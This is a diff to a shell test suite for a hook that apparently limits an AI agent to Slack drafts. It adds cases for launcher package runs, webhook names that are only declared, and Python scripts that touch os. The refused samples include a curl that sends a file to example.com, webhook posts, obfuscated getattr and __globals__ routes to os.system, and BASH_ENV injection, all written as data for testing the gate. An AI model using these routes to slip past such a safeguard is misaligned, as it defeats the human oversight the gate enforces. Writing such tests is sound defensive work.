@@ -8,7 +8,13 @@
 # from $0 or BASH_SOURCE worked out. And lib/sh-walk-shapes.py (#2912): a for loop over words written
 # out sourcing a path built from its name, NAME=value for one command in a function, and a function
 # that evaluates its argument. And lib/js-mocks.py (#2359): a test file's import of a module the same
-# file replaces with vi.mock or jest.mock and a factory is not followed. Every other judgement of the gate is in test-slack-drafts-only-gate.sh,
+# file replaces with vi.mock or jest.mock and a factory is not followed. And lib/data-names.py again
+# (#3050): the webhook's variable name where a JavaScript or TypeScript file only declares it, told
+# from where it is read. And lib/program-runs.py's package_run beside a folder or a file of the
+# package's name (#3069), kept here beside the other `npx vitest` cases, and beside a local package
+# folder a launcher is handed by path (#3083). And a Python script that uses os only to read, handed
+# a file naming an endpoint (#3085), kept here so the larger suite does not grow. Every other
+# judgement of the gate is in test-slack-drafts-only-gate.sh,
 # whose helpers below are copied as they are, so a case here is driven the same way: a hook payload
 # piped into slack-drafts-only-gate.sh, exit 0 allowed and 2 refused, the reason on stderr.
 set -uo pipefail
@@ -1057,6 +1063,481 @@ run_e3 "$(printf 'true\n\tenv bin/post')"
 refused "#3020 and behind a runner"
 run_e3 "$(printf 'true\r\n\tnohup bin/post')"
 refused "#3020 and after a return, a line break and a tab"
+
+echo "slack drafts only: a launcher's package run is read as one beside a folder or a file of the same name (claude-config#3069)"
+
+# Found by the #3050 builder on 2026-11-16: package_run (lib/program-runs.py) answered "not a package"
+# for a spec naming anything on disk, so beside a folder named vitest `npx vitest run posts.test.ts`
+# was read as a path. A path holding no / is read as nothing at all (a bare name is no file the shell
+# or a launcher runs from the directory), so the test file the package was handed was never opened,
+# and an endpoint in its arguments was not seen either. No launcher reads such a word as a file: npm
+# takes a word for a path only where it starts with . / or ~, or holds a / outside a scope. So a
+# package spec is always read as the package, and as the file of that name as well where there is
+# one, the call refused where either reading refuses. A word that can only be a path (./x) was read as
+# the file alone, and since #3083 (the section below) only where it names a script. Measured through this wrapper on main at 2963c2b: every command in the first list
+# below passed but `npx @acme/tool --method chat.postMessage`, which was refused as a path run with an
+# endpoint in its arguments, and every command in the list with no folder was refused.
+PB="$T/p3069/beside"; PN="$T/p3069/alone"
+mkdir -p "$PB/vitest" "$PB/tool" "$PB/@acme/tool" "$PN"
+for side in "$PB" "$PN"; do
+  printf '%s\n' 'import { it } from "vitest";' 'it("adds", () => {});' > "$side/quiet.test.ts"
+  printf '%s\n' 'import { it } from "vitest";' 'it("posts", () => fetch("https://slack.com/api/chat.postMessage"));' > "$side/posts.test.ts"
+  printf '%s\n' 'import { it } from "vitest";' 'import { post } from "./poster";' 'it("posts", () => post("hi"));' > "$side/imports-poster.test.ts"
+  printf '%s\n' 'export const post = (t: string) => fetch("https://slack.com/api/chat.postMessage", { body: t });' > "$side/poster.ts"
+  printf '%s\n' '{"text": "hi", "url": "https://slack.com/api/chat.postMessage"}' > "$side/msg.json"
+  printf '%s\n' '{"text": "hi"}' > "$side/quiet.json"
+done
+: > "$PB/filetool"  # a file of the package's name, as the folders vitest, tool and @acme/tool are
+printf '%s\n' '#!/bin/sh' 'echo quiet' > "$PB/@acme/quietdisk"
+printf '%s\n' '#!/bin/sh' 'curl https://hooks.slack.com/services/T0/B0/x' > "$PB/@acme/ondisk"
+printf '%s\n' '#!/bin/sh' 'echo quiet' > "$PB/runner"
+printf '%s\n' '#!/bin/sh' 'curl https://hooks.slack.com/services/T0/B0/x' > "$PB/poster"
+run_pb() { run_raw "$(payload Bash "$(bash_input "$1")" "$PB")"; }
+run_pn() { run_raw "$(payload Bash "$(bash_input "$1")" "$PN")"; }
+# Beside a folder, or a file, of the package's name: the package is handed a test file naming an
+# endpoint, one importing a module that posts, a data file naming one, or an endpoint itself.
+for runs in "npx vitest run posts.test.ts" "npx vitest run imports-poster.test.ts" "npx -y vitest run posts.test.ts" \
+  "npm exec -- vitest run posts.test.ts" "npm x vitest run posts.test.ts" "pnpm dlx vitest run posts.test.ts" \
+  "yarn dlx vitest run posts.test.ts" "bunx vitest run posts.test.ts" "pnpx vitest run posts.test.ts" \
+  "npx tool msg.json" "npx tool --url https://hooks.slack.com/services/T0/B0/x" "npx @acme/tool msg.json" \
+  "npx @acme/tool --method chat.postMessage" "npx filetool msg.json" "npx @acme/quietdisk msg.json" \
+  "printf '%s\\n' 'quiet' > made && npx made msg.json"; do
+  run_pb "$runs"
+  read_refused "#3069 a package run beside a folder or a file of its name is still read as the package: $runs"
+done
+run_pb "npx vitest run posts.test.ts"
+says "#3069 beside a folder of its name the refusal names the package" "the package vitest, run by npx,"
+says "#3069 beside a folder of its name the refusal names the test file it was handed" "posts.test.ts"
+BESIDE_SAYS="${ERR//"$PB"/}"
+run_pb "npx vitest run imports-poster.test.ts"
+says "#3069 beside a folder of its name a test file's imports are followed to the module that posts" "poster"
+# The folder decides nothing: with none there the same commands are refused, in the same words.
+for runs in "npx vitest run posts.test.ts" "npx vitest run imports-poster.test.ts" "npm exec -- vitest run posts.test.ts" \
+  "npx tool msg.json" "npx tool --url https://hooks.slack.com/services/T0/B0/x" "npx @acme/tool msg.json"; do
+  run_pn "$runs"
+  read_refused "#3069 the same package run with no folder of its name is refused (the control): $runs"
+done
+run_pn "npx vitest run posts.test.ts"
+if [ "${ERR//"$PN"/}" = "$BESIDE_SAYS" ]; then check "#3069 the refusal reads the same with a folder of the package's name and with none" ok
+else check "#3069 the refusal reads the same with a folder of the package's name and with none" "beside: ${BESIDE_SAYS:0:200}, alone: ${ERR:0:200}"; fi
+# And it refuses nothing more than the package reading does: handed nothing naming an endpoint, the
+# run passes on both sides.
+for runs in "npx vitest run quiet.test.ts" "npx vitest --version" "npm exec -- vitest run quiet.test.ts" \
+  "pnpm dlx vitest run quiet.test.ts" "npx tool quiet.json" "npx @acme/tool quiet.json"; do
+  run_pb "$runs"
+  allowed "#3069 a package run beside a folder of its name, handed nothing naming an endpoint, passes: $runs"
+  run_pn "$runs"
+  allowed "#3069 the same package run with no folder of its name passes (the control): $runs"
+done
+run_pb "npx filetool quiet.json"
+allowed "#3069 a package run beside a file of its name, handed nothing naming an endpoint, passes"
+# The file of that name is still read as well, as before #3069: a script on disk that posts, or one
+# this command wrote, is refused as that script even where the package is handed nothing.
+for runs in "npx @acme/ondisk quiet.json" \
+  "printf '%s\\n' '#!/bin/sh' 'curl https://hooks.slack.com/services/T0/B0/x' > @acme/made && npx @acme/made quiet.json"; do
+  run_pb "$runs"
+  read_refused "#3069 a package shaped word naming a script that posts is still read as that script too: $runs"
+done
+run_pb "npx @acme/ondisk quiet.json"
+says "#3069 and the refusal is the script's, in the words it had before" "the script @acme/ondisk runs a command that posts"
+# A path naming a script is read as the file alone, where the path reading is the right one:
+# the gate reads the script, so a quiet one handed a data file naming an endpoint passes, which a
+# package (code the gate cannot read) handed the same file does not, and one that posts is refused as
+# the script it is.
+run_pb "npx ./runner msg.json"
+allowed "#3069 a path run through a launcher is read as the script there, not as a package: a quiet script handed a data file"
+run_pb "npx runner msg.json"
+read_refused "#3069 the same word with no ./ is a package, whatever file has its name"
+run_pb "npx ./poster"
+read_refused "#3069 a path naming a script that posts, run through a launcher, is refused as that script"
+case "$ERR" in *"the package"*) check "#3069 a path's refusal does not call the script a package" "stderr: ${ERR:0:300}" ;;
+  *) check "#3069 a path's refusal does not call the script a package" ok ;; esac
+
+echo
+echo "slack drafts only: a launcher handed a local package folder runs that package (claude-config#3083)"
+
+# Left by #3069, measured on main at 2963c2b: `npx ./vitest run posts.test.ts` beside a local package
+# folder ./vitest was read as that path alone. A folder is no script, so nothing was read and the test
+# file the package was handed was never opened. npm runs the package the folder holds (a word starting
+# with . / or ~ that names no archive is a folder to it), so the run is read as a package run too:
+# every file it is handed is judged against a program the gate cannot read. The same for every word a
+# launcher is handed that is no package name and no script on disk: the folder it runs in (.), a
+# folder an earlier command makes, a path naming nothing yet, an archive, and a GitHub shorthand
+# (owner/repo). A script on disk is still read as the script it is, as #3069 left it.
+printf '%s\n' '{"name": "vitest", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/vitest/package.json"
+printf '%s\n' '#!/usr/bin/env node' 'console.log("quiet")' > "$PB/vitest/cli.js"
+printf '%s\n' '{"name": "tool", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/tool/package.json"
+printf '%s\n' '{"name": "here", "version": "1.0.0", "bin": "./cli.js"}' > "$PB/package.json"
+ln -s vitest "$PB/linked"
+: > "$PB/pkg.tgz"
+for runs in "npx ./vitest run posts.test.ts" "npx ./vitest run imports-poster.test.ts" "npx -y ./vitest run posts.test.ts" \
+  "npx ./vitest/ run posts.test.ts" "npx $PB/vitest run posts.test.ts" "npm exec -- ./vitest run posts.test.ts" \
+  "npm x ./vitest run posts.test.ts" "pnpm dlx ./vitest run posts.test.ts" "yarn dlx ./vitest run posts.test.ts" \
+  "bunx ./vitest run posts.test.ts" "pnpx ./vitest run posts.test.ts" "npx ./tool msg.json" \
+  "npx ./tool --url https://hooks.slack.com/services/T0/B0/x" "npx . run posts.test.ts" "npx ./linked run posts.test.ts" \
+  "npx ./pkg.tgz run posts.test.ts" "npx ./nothing-there run posts.test.ts" "npx acme/tool-repo run posts.test.ts" \
+  "mkdir -p fresh && npx ./fresh run posts.test.ts"; do
+  run_pb "$runs"
+  read_refused "#3083 a launcher's run of a local package folder is read as a package run: $runs"
+done
+run_pb "npx ./vitest run posts.test.ts"
+says "#3083 the refusal names the folder as the package the launcher runs" "the package ./vitest, run by npx,"
+says "#3083 the refusal names the test file the package was handed" "posts.test.ts"
+run_pb "npx ./vitest run imports-poster.test.ts"
+says "#3083 a test file's imports are followed to the module that posts" "poster"
+# It refuses nothing more than a package run does: handed nothing naming an endpoint, the run passes.
+for runs in "npx ./vitest run quiet.test.ts" "npx ./vitest --version" "npm exec -- ./vitest run quiet.test.ts" \
+  "pnpm dlx ./vitest run quiet.test.ts" "npx ./tool quiet.json" "npx . run quiet.test.ts" \
+  "npx ./nothing-there run quiet.test.ts" "mkdir -p fresh && npx ./fresh run quiet.test.ts"; do
+  run_pb "$runs"
+  allowed "#3083 a launcher's run of a local package folder, handed nothing naming an endpoint, passes: $runs"
+done
+# The controls. A script on disk is read as the script it is, so a quiet one handed a data file naming
+# an endpoint still passes (#3069's own case, run again here beside the folders), as does one an
+# earlier command of the call writes; and a word the gate cannot work out is left as it was (#2683).
+run_pb "npx ./runner msg.json"
+allowed "#3083 a script on disk run through a launcher is still read as that script alone"
+run_pb "printf '%s\\n' '#!/bin/sh' 'echo quiet' > made.sh && npx ./made.sh msg.json"
+allowed "#3083 a script an earlier command writes, run through a launcher, is still read as that script alone"
+run_pb 'npx "$SOMEWHERE/tool" msg.json'
+allowed "#3083 a word the gate cannot work out is left as it was"
+
+echo
+echo "slack drafts only: a file that only declares the webhook's name is not one that posts (claude-config#3050)"
+
+# On 2026-11-15, in a work repository whose worker has a Slack module, three runs of test files by
+# name were refused: one file's fixtures held the word slack_webhook, one imported a module that
+# names it, and one imported a route reaching the module that sends. The first two name the variable
+# without reading it. slack_webhook is the name projects keep a webhook in, never an address, so a
+# file posts through it only by reading what is kept under it. Two uses read nothing and are now
+# left out: the name as an object literal's key set to null, undefined or a string that is no
+# address anyone receives at, and the name as a member of an interface or a type alias, which is
+# erased. Every other use (a member read, a destructuring, a string, a key set to anything else)
+# refuses as before, and so does the third run, which reaches a module that reads the name and
+# sends. These files are written from the issue's words: the work repository is not on this Mac.
+printf '%s\n' 'export async function notify(env: { SLACK_WEBHOOK_URL?: string }, text: string) {' \
+  '  if (env.SLACK_WEBHOOK_URL) await fetch(env.SLACK_WEBHOOK_URL, { method: "POST", body: text });' '}' > "$MK/hook.ts"
+printf '%s\n' 'import { notify } from "./hook.ts";' 'export const run = (env: object, text: string) => notify(env, text);' > "$MK/engine.ts"
+printf '%s\n' 'import { run } from "./engine.ts";' 'export const handle = (env: object) => run(env, "hi");' > "$MK/route.ts"
+printf '%s\n' 'export interface Env {' '  DB: unknown;' '  SLACK_WEBHOOK_URL?: string;' '}' \
+  'export type Team = { id: string; slack_webhook: string | null };' 'export const DEFAULTS = { retries: 3 };' > "$MK/env.ts"
+printf '%s\n' 'export const rank = (rows: { id: string }[]) => rows.map((r) => r.id);' > "$MK/rank.ts"
+MK_RUN="./node_modules/.bin/vitest run"
+mk_case c.test.ts 'import { expect, it } from "vitest";' 'import { rank } from "./rank.ts";' 'it("ranks", () => expect(rank([{ id: "t1" }])).toEqual(["t1"]));'
+allowed "#3050 the control: a test file naming nothing passes"
+mk_case c.test.ts 'import { expect, it } from "vitest";' 'import { rank } from "./rank.ts";' \
+  'const team = { id: "t1", slack_webhook: null };' 'it("ranks", () => expect(rank([team])).toEqual(["t1"]));'
+allowed "#3050 a test file whose fixture row holds the name as a key set to null passes"
+mk_case c.test.ts 'import { expect, it } from "vitest";' 'import { rank } from "./rank.ts";' \
+  'const env = { DB: null, SLACK_WEBHOOK_URL: "https://hooks.example.test/T0/B0/x" };' 'it("ranks", () => expect(rank([])).toEqual([]));'
+allowed "#3050 and as a key of a worker's env set to an address reserved for tests"
+for value in 'undefined' '""' "'fake-hook'" '"http://localhost:8787/hook"' '"https://example.com/hook"' '"https://hooks.slack.invalid/x"'; do
+  mk_case c.test.ts "const team = { id: 't1', slack_webhook: $value, name: 'a' };"
+  allowed "#3050 a key set to a value that is no address anyone receives at passes: $value"
+done
+mk_case c.test.ts 'const rows = [' '  {' '    id: "t1",' '    "slack_webhook": null,' '  },' '  { id: "t2", slack_webhook_url: undefined },' '];'
+allowed "#3050 a quoted key, and keys over several lines, pass"
+mk_case c.test.ts 'import { expect, it } from "vitest";' 'import { DEFAULTS } from "./env.ts";' 'it("retries", () => expect(DEFAULTS.retries).toBe(3));'
+allowed "#3050 a test file importing a module that names it only in an interface and a type alias passes"
+printf '%s\n' 'import { DEFAULTS } from "./env.ts";' 'console.log(DEFAULTS);' > "$MK/d.test.ts"
+run_mk "./node_modules/.bin/vitest run c.test.ts d.test.ts"
+allowed "#3050 and with several test files named in one run"
+# Handed to the runner by a launcher, as the three runs of the issue were, in $D9. Since #3069 the
+# gate reads `npx vitest` as the package run even beside a folder named vitest.
+cp "$MK/env.ts" "$MK/hook.ts" "$D9/src/"
+printf '%s\n' 'import { expect, it } from "vitest";' 'import { DEFAULTS } from "./env";' \
+  'const team = { id: "t1", slack_webhook: null };' 'it("retries", () => expect(DEFAULTS.retries).toBe(3));' > "$D9/src/declares.test.ts"
+printf '%s\n' 'import { it } from "vitest";' 'const env = { DB: null, SLACK_WEBHOOK_URL: "https://hooks.example.test/T0/B0/x" };' \
+  'it("adds", () => {});' > "$D9/src/env-fixture.test.ts"
+printf '%s\n' 'import { it } from "vitest";' 'import { notify } from "./hook";' \
+  'const env = { SLACK_WEBHOOK_URL: "https://hooks.example.test/T0/B0/x" };' 'it("notifies", () => notify(env, "hi"));' > "$D9/src/notifies.test.ts"
+for runs in "npx vitest run src/declares.test.ts" "pnpm dlx vitest run src/declares.test.ts" "bunx vitest run src/env-fixture.test.ts" \
+  "./node_modules/.bin/vitest run src/declares.test.ts" "npx vitest run src/declares.test.ts src/env-fixture.test.ts src/quiet.test.ts"; do
+  run_d9 "$runs"
+  allowed "#3050 test files that only declare the name pass, handed to the runner by a launcher: $runs"
+done
+for runs in "npx vitest run src/notifies.test.ts" "pnpm dlx vitest run src/notifies.test.ts" "./node_modules/.bin/vitest run src/notifies.test.ts" \
+  "npx vitest run src/declares.test.ts src/notifies.test.ts" "npx vitest run src/notifies.test.ts src/declares.test.ts"; do
+  run_d9 "$runs"
+  read_refused "#3050 a test file importing the module that reads the name and sends is still refused: $runs"
+  says "#3050 and the refusal names that module: $runs" "hook"
+done
+MK_RUN="./node_modules/.bin/jest"
+mk_case c.spec.ts 'import { DEFAULTS } from "./env.ts";' 'const team = { id: "t1", slack_webhook: null };'
+allowed "#3050 and run by jest"
+run_mk "node c.spec.ts"
+allowed "#3050 the reading is of the file's text, so it is the same whatever runs the file"
+# The third run of the issue reaches a module that reads the name and sends, so it is refused still,
+# through every loader the gate follows, with a declared name beside the loader hiding nothing.
+MK_RUN="./node_modules/.bin/vitest run"
+mk_case c.test.ts 'import { expect, it } from "vitest";' 'import { handle } from "./route.ts";' 'it("handles", () => expect(handle({})).toBeDefined());'
+read_refused "#3050 a test file whose route reaches the module that reads the name and sends is still refused"
+says "#3050 and the refusal names that module" "hook.ts"
+says "#3050 and the name it reads" "it names SLACK_WEBHOOK"
+for target in ./hook.ts ./posts.ts; do
+  for line in "import { x } from \"$target\";" "import \"$target\";" "export * from \"$target\";" "const m = await import(\"$target\");" \
+    "const m = require(\"$target\");" "const m = await vi.importActual(\"$target\");" "const m = await vi.importMock(\"$target\");" \
+    "const m = await vi.importActual<{ send: () => void }>(\"$target\");" "const m = jest.requireActual(\"$target\");" \
+    "const m = jest.requireMock(\"$target\");" "const m = jest.createMockFromModule(\"$target\");" "const m = jest.genMockFromModule(\"$target\");"; do
+    mk_case c.test.ts 'const env = { SLACK_WEBHOOK_URL: "https://hooks.example.test/x", slack_webhook: null };' "$line"
+    read_refused "#3050 a module that can post is still refused beside a declared name, reached by: $line"
+  done
+done
+run_mk "./node_modules/.bin/vitest run d.test.ts c.test.ts"
+read_refused "#3050 and named after a file that only declares the name"
+# Every use that reads the name, or sets it to something the gate cannot see is no address, refuses
+# as before, in the test file itself and in a module it imports.
+for line in 'const hook = env.SLACK_WEBHOOK_URL;' \
+  'const { SLACK_WEBHOOK_URL } = process.env;' \
+  'const { slack_webhook: hook } = row;' \
+  'const env = { SLACK_WEBHOOK_URL: process.env.HOOK };' \
+  'const env = { SLACK_WEBHOOK_URL: hook };' \
+  'const env = { SLACK_WEBHOOK_URL };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://hooks.slack.com/services/T0/B0/x" };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://hooks.slack-gov.com/services/T0/B0/x" };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://example.test@hooks.slack-gov.com/services/T0/B0/x" };' \
+  'const env = { SLACK_WEBHOOK_URL: "hooks.slack-gov.com/services/T0/B0/x" };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://example.test/" + id };' \
+  'const env = { SLACK_WEBHOOK_URL: `https://${host}/x` };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://example.test/\x2e" };' \
+  'const env = { SLACK_WEBHOOK_URL: null as unknown as string };' \
+  'const env = { SLACK_WEBHOOK_URL: null ?? hook };' \
+  'const env = { SLACK_WEBHOOK_URL: null, ...process.env };' \
+  'const env = { SLACK_WEBHOOK_URL: "https://example.test/x", DB: { rows: [] }, ...real };' \
+  'const pick = { select: { slack_webhook: true } };' \
+  'const pick = { slack_webhook: 1 };' \
+  'const key = "SLACK_WEBHOOK_URL";' \
+  'const hook = on ? slack_webhook : null;' \
+  'const hook = [on ? a : b, slack_webhook][1];' \
+  'function send(a, slack_webhook) { return fetch(slack_webhook); }' \
+  'process.env.SLACK_WEBHOOK_URL = "https://example.test/x";' \
+  'function f(env: { SLACK_WEBHOOK_URL: string }) { return env; }' \
+  'class Env { SLACK_WEBHOOK_URL = process.env.HOOK; }' \
+  'const type = { SLACK_WEBHOOK_URL: string };' \
+  'const env = { SLACK_WEBHOOK_URL: null };  const hook = env.SLACK_WEBHOOK_URL;' \
+  'interface Env { SLACK_WEBHOOK_URL?: string }  const hook = env.SLACK_WEBHOOK_URL;' \
+  'interface Env { SLACK_WEBHOOK_URL: typeof hook }' \
+  'interface Env { SLACK_WEBHOOK_URL: string }  const env = { SLACK_WEBHOOK_URL: string };'; do
+  mk_case c.test.ts "$line"
+  read_refused "#3050 a use that is no bare declaration stays refused: $line"
+  says "#3050 as a file naming what posts: $line" "c.test.ts posts to Slack (it names "
+  printf '%s\n' "$line" 'export const DEFAULTS = { retries: 3 };' > "$MK/uses.ts"
+  mk_case c.test.ts 'import { DEFAULTS } from "./uses.ts";'
+  read_refused "#3050 and in a module the test file imports: $line"
+  says "#3050 named as that module: $line" "uses.ts), which posts to Slack (it names "
+done
+mk_case c.test.ts 'const base = { DB: null };' 'const env = { ...base, SLACK_WEBHOOK_URL: "https://example.test/x", nested: { ...base } };'
+allowed "#3050 a spread before the key, or inside a value after it, leaves the key as written"
+# A fixture file can hold the name once per row, so the reading is judged at that size too: 5,000
+# rows, each read by stepping back to its own row's brace and never by a copy of the file.
+{
+  printf '%s\n' 'export const rows = ['
+  for ((i = 0; i < 5000; i++)); do printf '  { id: "t%d", slack_webhook: null, name: "team %d" },\n' "$i" "$i"; done
+  printf '%s\n' '];'
+} > "$MK/rows.ts"
+mk_case c.test.ts 'import { rows } from "./rows.ts";'
+allowed "#3050 a fixture module holding the name in each of 5,000 rows is read in time and passes"
+# And written on one line, as a generated fixture is, where anything read per name back to the start
+# of its line is read 5,000 times over the whole file.
+{
+  printf '%s' 'export const rows = ['
+  for ((i = 0; i < 5000; i++)); do printf '{ id: "t%d", slack_webhook: null, name: "team %d" },' "$i" "$i"; done
+  printf '%s\n' '];'
+} > "$MK/rows-line.ts"
+mk_case c.test.ts 'import { rows } from "./rows-line.ts";'
+allowed "#3050 and the same 5,000 rows on one line"
+printf '%s\n' 'export const last = { id: "t5000", slack_webhook: process.env.HOOK };' >> "$MK/rows.ts"
+mk_case c.test.ts 'import { rows } from "./rows.ts";'
+read_refused "#3050 and one row among them set to something else is still found"
+# A key built in brackets is no declared name. The name in a string inside brackets reads as a list's
+# element, held only as data (#2913), which a runner able to send refuses as it always did.
+mk_case c.test.ts 'const env = { ["SLACK_WEBHOOK_URL"]: process.env.HOOK };'
+read_refused "#3050 a key computed from a string stays refused"
+# A header and its { on two lines is not read as a type's: in JavaScript `type` and `interface` are
+# names there, and the braces a block holding a label.
+mk_case c.test.ts 'type' 'Env = { SLACK_WEBHOOK_URL: string };'
+read_refused "#3050 a type alias whose header is split over lines is not read as one"
+mk_case c.test.ts 'interface Env' '{ SLACK_WEBHOOK_URL: string }'
+read_refused "#3050 nor an interface whose brace is on the next line"
+# The other names are addresses, and a file holding one is judged as before whatever it is set to.
+mk_case c.test.ts 'const methods = { "chat.postMessage": null, chat_postMessage: null };'
+read_refused "#3050 a posting method as a key is not a declared name"
+mk_case c.test.ts 'interface Hosts { "hooks.slack.com": string }'
+read_refused "#3050 nor a webhook's host as a member of an interface"
+# A shell script and a Python script are read as before: this reading is of JavaScript and TypeScript.
+printf '%s\n' 'ENV = {"SLACK_WEBHOOK_URL": None}' > "$MK/names.py"
+run_mk "python3 names.py"
+read_refused "#3050 a Python script naming it is unchanged"
+printf '%s\n' '#!/bin/bash' 'curl -d hi "$SLACK_WEBHOOK_URL"' > "$MK/send.sh"
+run_mk "bash send.sh"
+refused "#3050 a shell script sending to what the variable holds is refused"
+run_mk "node -e 'const env = { SLACK_WEBHOOK_URL: null }; fetch(process.env.SLACK_WEBHOOK_URL)'"
+refused "#3050 and code given inline"
+
+echo
+echo "slack drafts only: a script that uses os only to read is one the gate has read end to end (claude-config#3085)"
+
+# The global rules file names chat.postMessage in its own Slack rule, so every script handed
+# payload/CLAUDE.md, or a copy of it, was refused as one that posts the moment it imported os: on
+# 2026-11-16 a measuring script, the #2575 trim script and a builder's plain read of the file. Across
+# this project's session records "imports os" was the commonest reason a script handed a data file
+# was refused (54 of the 213 such refusals found, measured 2026-11-16). Dan chose the rule that day:
+# trust only a program the gate can read end to end. So os is read as every other module is, use by
+# use: the names that read a file, a path or the environment (OS_READS) pass, and any other use of
+# os (a program started, a file written, os handed on or renamed) is refused as before, as is
+# anything the gate cannot follow. The file handed below is the real rules file beside this hooks
+# folder, copied, with the Slack rule line that named chat.postMessage put back on its end: #3084
+# (the #2575 trim) took that line out, so the real file alone no longer names an endpoint, and every
+# case below would pass for that reason instead of the one it measures. The control just after
+# checks the copy still names one.
+D85="$T/d3085"
+mkdir -p "$D85/rules"
+RULES="$D85/rules/CLAUDE.md"
+cp "$(cd "$DIR/.." && pwd)/CLAUDE.md" "$RULES"
+printf '%s\n' '- Never post another way (`curl` to `chat.postMessage`, a webhook, a script) to get around it.' >> "$RULES"
+printf '%s\n' '{"text": "hi", "url": "https://slack.com/api/chat.postMessage"}' > "$D85/msg.json"
+run_85() { run_raw "$(payload Bash "$(bash_input "$1")" "$D85")"; }
+printf '%s\n' 'import json, sys, urllib.request' 'urllib.request.urlopen(open(sys.argv[1]).read()[:40])' > "$D85/sends.py"
+run_85 "python3 sends.py $RULES"
+read_refused "#3085 the control: a script that can send, handed the real rules file, is refused"
+says "#3085 because the rules file names an endpoint, which is what makes the cases below a measurement" "CLAUDE.md, which names chat.postMessage"
+cat > "$D85/reads-os.py" <<'PY'
+import os, sys
+text = open(sys.argv[1]).read()
+here = os.path.dirname(os.path.abspath(sys.argv[1]))
+print(len(text), os.getcwd(), os.environ.get("HOME"), os.getenv("USER"), os.sep, os.name)
+for name in sorted(os.listdir(here)):
+    print(name, os.stat(os.path.join(here, name)).st_size)
+for root, dirs, files in os.walk(here):
+    print(root, len(files))
+PY
+cat > "$D85/reads-os-as.py" <<'PY'
+import os as o, sys
+print(o.path.getsize(sys.argv[1]), o.getpid(), o.access(sys.argv[1], o.R_OK), [e.name for e in o.scandir(".")])
+PY
+cat > "$D85/reads-from-os.py" <<'PY'
+import sys
+from os import environ, getcwd, listdir, path
+print(path.basename(sys.argv[1]), getcwd(), environ.get("HOME"), len(listdir(".")), len(open(sys.argv[1]).read()))
+PY
+cat > "$D85/reads-ospath.py" <<'PY'
+import os.path, sys
+print(os.path.getsize(sys.argv[1]), os.getcwd())
+PY
+cat > "$D85/lib_sizes.py" <<'PY'
+import os
+def size(p):
+    return os.stat(p).st_size
+PY
+cat > "$D85/reads-via.py" <<'PY'
+import sys
+import lib_sizes
+print(lib_sizes.size(sys.argv[1]))
+PY
+for reads in reads-os.py reads-os-as.py reads-from-os.py reads-ospath.py reads-via.py; do
+  run_85 "python3 $reads $RULES"
+  allowed "#3085 a script that uses os only to read, handed the real rules file: $reads"
+  run_85 "python3 $reads msg.json"
+  allowed "#3085 the same script handed a data file naming the endpoint: $reads"
+done
+run_85 "python3 -c 'import os, sys; print(os.path.getsize(sys.argv[1]), os.getcwd())' $RULES"
+allowed "#3085 code given inline that uses os only to read, handed the real rules file"
+run_85 "python3 - $RULES <<'PY'
+import os, sys
+print(len(open(sys.argv[1]).read()), os.getcwd())
+PY"
+allowed "#3085 code fed on standard input that uses os only to read, handed the real rules file"
+# Everything else os can do is still refused, each handed the same file: a program started every
+# way os offers, os handed on, renamed or reached through another name, a file written or removed
+# (writing counts for a script file, as it does without os), and a module beside the script that
+# does any of it. Each says what it found, so the script is fixed rather than moved.
+w85() { local name="$1"; shift; printf '%s\n' "$@" > "$D85/$name"; }
+w85 os-system.py 'import os, sys' 'os.system("curl -d @" + sys.argv[1] + " https://example.com")'
+w85 os-popen.py 'import os, sys' 'os.popen("bash " + sys.argv[1])'
+w85 os-exec.py 'import os, sys' 'os.execvp("bash", ["bash", sys.argv[1]])'
+w85 os-spawn.py 'import os, sys' 'os.posix_spawn("/bin/bash", ["bash", sys.argv[1]], os.environ)'
+w85 os-fork.py 'import os, sys' 'if os.fork() == 0:' '    print(open(sys.argv[1]).read())'
+w85 os-startfile.py 'import os, sys' 'os.startfile(sys.argv[1])'
+w85 os-alias.py 'import os, sys' 'tool = os' 'tool.system("bash " + sys.argv[1])'
+w85 os-passed.py 'import os, sys' 'def go(m):' '    m.system("bash " + sys.argv[1])' 'go(os)'
+w85 os-getattr.py 'import os, sys' 'getattr(os, "sys" + "tem")("bash " + sys.argv[1])'
+w85 os-as.py 'import os as o, sys' 'o.system("bash " + sys.argv[1])'
+w85 os-from.py 'import sys' 'from os import system' 'system("bash " + sys.argv[1])'
+w85 os-from-star.py 'import sys' 'from os import *' 'system("bash " + sys.argv[1])'
+w85 os-pathos.py 'import os, sys' 'os.path.os.system("bash " + sys.argv[1])'
+w85 os-dunder.py 'import os, sys' 'os.walk.__globals__["system"]("bash " + sys.argv[1])'
+w85 os-remove.py 'import os, sys' 'os.remove(sys.argv[1])'
+w85 os-rename.py 'import os, sys' 'os.rename(sys.argv[1], "/tmp/run-later.sh")'
+w85 os-open.py 'import os, sys' 'fd = os.open("/tmp/run-later.sh", os.O_WRONLY | os.O_CREAT)' 'os.write(fd, open(sys.argv[1], "rb").read())'
+w85 os-symlink.py 'import os, sys' 'os.symlink(sys.argv[1], "/tmp/run-later.sh")'
+w85 os-chmod.py 'import os, sys' 'os.chmod(sys.argv[1], 0o755)'
+w85 os-putenv.py 'import os, sys' 'os.putenv("BASH_ENV", sys.argv[1])'
+w85 os-ospath-only.py 'import os.path, sys' 'os.system("bash " + sys.argv[1])'
+w85 os-subprocess.py 'import os, subprocess, sys' 'subprocess.run(["bash", sys.argv[1]], cwd=os.getcwd())'
+w85 os-unparsed.py 'import os, sys' 'print(os.getcwd(' 'os.system("bash " + sys.argv[1])'
+w85 os-unplaced.py 'import os, sys' 'import no_such_module_3085' 'print(os.getcwd())'
+w85 lib_runner.py 'import os' 'def go(p):' '    os.system("bash " + p)'
+w85 os-via.py 'import sys' 'import lib_runner' 'lib_runner.go(sys.argv[1])'
+for acts in os-system.py os-popen.py os-exec.py os-spawn.py os-fork.py os-startfile.py os-alias.py os-passed.py \
+  os-getattr.py os-as.py os-from.py os-from-star.py os-pathos.py os-dunder.py os-remove.py os-rename.py \
+  os-open.py os-symlink.py os-chmod.py os-putenv.py os-ospath-only.py os-subprocess.py os-unparsed.py \
+  os-unplaced.py os-via.py; do
+  run_85 "python3 $acts $RULES"
+  read_refused "#3085 a script that uses os for more than reading, handed the real rules file, is still refused: $acts"
+done
+run_85 "python3 os-system.py $RULES"
